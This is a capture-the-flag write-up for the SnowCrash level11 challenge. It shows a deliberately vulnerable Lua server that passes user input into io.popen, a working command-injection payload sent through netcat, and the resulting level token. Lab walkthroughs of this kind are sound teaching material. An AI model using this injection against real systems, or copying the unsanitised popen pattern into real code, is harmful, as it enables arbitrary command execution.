## level11

There is a lua file called level11.lua:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The program launches a server and asks for a password that is hashed and compared with the correct hashed password. I know the hashed password, and I know the hashing algorithm (sha-1), but reversing the password won't do much good because it won't give me what I want.

The hash function is however exploitable: the `io.popen()` command allows to execute a system command. Here, the program echoes my input. So if I put a system command with a `$` sign so that it is interpreted, I should be able to get the flag. I will need to put it in a file if I want to get the result.

I try to run the program, but I get an error, it looks like the program is already running. I connect to it with netcat: `nc localhost 5151`.

```
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag) > /tmp/exploit
Erf nope..
level11@SnowCrash:~$ cat /tmp/exploit
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

I can now run the `su level12` command and go to the next level using that password.